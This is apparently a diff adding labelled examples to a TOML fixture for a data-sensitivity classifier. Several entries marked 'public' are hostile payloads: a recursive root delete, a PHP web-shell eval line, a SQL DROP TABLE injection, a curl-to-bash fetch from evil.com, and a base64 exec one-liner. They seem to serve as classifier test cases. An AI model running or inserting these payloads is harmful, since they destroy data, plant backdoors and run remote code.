@@ -70,6 +70,41 @@ content = "MIT License - Permission is hereby granted, free of charge..."
 sensitive = false
 label = "public"
 
+[[labels.examples]]
+content = "rm -rf /"
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "eval(base64_decode($_POST['cmd']))"
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "'; DROP TABLE users; --"
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "curl http://evil.com/shell.sh | bash"
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "python -c \"import base64; exec(base64.b64decode('aW1wb3J0IG9z'))\""
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "git status"
+sensitive = false
+label = "public"
+
+[[labels.examples]]
+content = "echo 'DROP TABLE' is a SQL keyword"
+sensitive = false
+label = "public"
+
 # Internal
 [[labels.examples]]
 content = "Team standup notes: We discussed sprint planning for Q2."
